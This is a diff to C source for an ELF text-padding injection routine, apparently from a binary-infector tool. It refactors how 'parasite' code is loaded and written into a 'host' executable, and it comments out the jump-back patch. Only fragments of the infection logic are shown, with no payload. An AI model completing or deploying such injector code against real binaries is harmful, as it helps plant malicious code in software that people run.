@@ -152,7 +152,7 @@ uint32_t textpadding_inject_32(Elfit_t *host, char *parasite, uint32_t patch_pos
     return text_begin + entry_offset; 
 }
 
-uint64_t textpadding_inject_64(Elfit_t *host, char *parasite, uint64_t patch_position, 
+uint64_t textpadding_inject_64(Elfit_t *host, Elfit_t *parasite, uint64_t patch_position, 
     uint64_t patch_addr)
 {
     unsigned long entry_point, text_offset, text_begin, tmp_addr;
@@ -168,19 +168,7 @@ uint64_t textpadding_inject_64(Elfit_t *host, char *parasite, uint64_t patch_pos
     Elf64_Shdr *shdr;
     int i, wrote;
 
-    if ((pfd = open(parasite, O_RDONLY)) == -1)
-    {
-        perror("parasite open");
-        exit(-1);
-    }
-
-    if (fstat(pfd, &pst))
-    {
-        perror("parasite stat");
-        exit(-1);
-    }
-
-    psize = pst.st_size;
+    psize = parasite->file->st_size;
 
     ehdr = (Elf64_Ehdr *) host->mem;
     entry_point = ehdr->e_entry;
@@ -239,12 +227,6 @@ uint64_t textpadding_inject_64(Elfit_t *host, char *parasite, uint64_t patch_pos
         exit(-1);
     }
 
-    if (read(pfd, buf, psize) == -1)
-    {
-        perror("parasite: read");
-        exit(-1);
-    }
-
     int preparasite_size_file = text_offset + entry_offset;
 
     // patch parasite code
@@ -253,8 +235,10 @@ uint64_t textpadding_inject_64(Elfit_t *host, char *parasite, uint64_t patch_pos
     else
         tmp_addr = patch_addr;
 
-    *(uint64_t *)&buf[patch_position] = tmp_addr;
+    /*
+    *(uint64_t *)&parasite->mem[patch_position] = tmp_addr;
     printf("[+ TEXT_PAD INJECT]\tPatching parasite to jmp to 0x%x\n", tmp_addr);
+    */
 
     if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
         < 0) 
@@ -269,7 +253,7 @@ uint64_t textpadding_inject_64(Elfit_t *host, char *parasite, uint64_t patch_pos
         exit(-1);
     }
 
-    if ((wrote = write(ofd, buf, psize)) != psize) 
+    if ((wrote = write(ofd, parasite->mem, psize)) != psize) 
     {
         perror("tmp binary: write parasite");
         exit(-1);
